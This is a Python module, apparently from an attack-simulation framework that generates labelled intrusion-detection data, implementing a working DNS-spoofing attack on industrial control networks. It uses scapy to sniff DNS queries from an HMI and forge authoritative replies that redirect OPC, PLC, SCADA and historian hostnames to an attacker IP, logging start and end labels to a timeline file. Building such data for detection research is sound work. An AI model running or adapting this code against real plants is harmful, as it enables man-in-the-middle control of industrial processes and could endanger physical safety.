"""
DNS_SPOOF_ICS
Kỹ thuật: Giả mạo DNS response để redirect HMI -> fake server
Observable: DNS anomaly - response từ IP không phải DNS server
Yêu cầu: scapy, chạy với quyền root

Gọi từ bash (root required):
  sudo python -m attacks_ext.dns_spoof_ics \
      --iface eth0 --hmi-ip 192.168.1.20 --attacker-ip 192.168.1.100 \
      --duration 300 --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
from attacks_ext.config_ext import base_parser, write_label

spoof_count = 0
running = True


def run(args):
    from scapy.all import sniff, send, DNS, DNSRR, DNSQR, IP, UDP, conf
    conf.verb = 0

    SPOOF_TARGETS = {
        "opcserver.local":    args.attacker_ip,
        "plc-controller":     args.attacker_ip,
        "scada-server.local": args.attacker_ip,
        "historian.local":    args.attacker_ip,
    }

    global spoof_count, running
    spoof_count = 0
    running = True
    label_prefix = "DNS_SPOOF_ICS"

    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s iface={args.iface}")

    def dns_spoof_callback(packet):
        global spoof_count
        if not running:
            return
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            queried_name = packet[DNSQR].qname.decode().rstrip(".")
            if queried_name in SPOOF_TARGETS:
                fake_ip = SPOOF_TARGETS[queried_name]
                spoofed = (
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    UDP(sport=53, dport=packet[UDP].sport) /
                    DNS(
                        id=packet[DNS].id, qr=1, aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=300, rdata=fake_ip)
                    )
                )
                send(spoofed, verbose=False, iface=args.iface)
                spoof_count += 1
                print(f"  [SPOOF #{spoof_count}] {queried_name} -> {fake_ip}")

    try:
        filter_str = "udp port 53"
        if hasattr(args, "hmi_ip") and args.hmi_ip:
            filter_str = f"udp port 53 and src host {args.hmi_ip}"

        print(f"[*] Lắng nghe DNS query ({filter_str})...")
        print(f"[*] Sẽ tự động dừng sau {args.duration}s\n")

        sniff(
            filter=filter_str,
            prn=dns_spoof_callback,
            iface=args.iface,
            timeout=args.duration - 5,
            store=False
        )
    except KeyboardInterrupt:
        print("\n[*] Dừng bởi người dùng")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        running = False
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"spoof_responses={spoof_count}")
        print(f"\n[SUMMARY] Đã gửi {spoof_count} DNS response giả")


def main():
    p = base_parser("DNS Spoofing Attack for ICS")
    p.add_argument("--iface", default="eth0", help="Network interface")
    p.add_argument("--hmi-ip", default="", help="HMI IP to filter")
    p.add_argument("--attacker-ip", default="192.168.1.100", help="Attacker IP for spoof")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
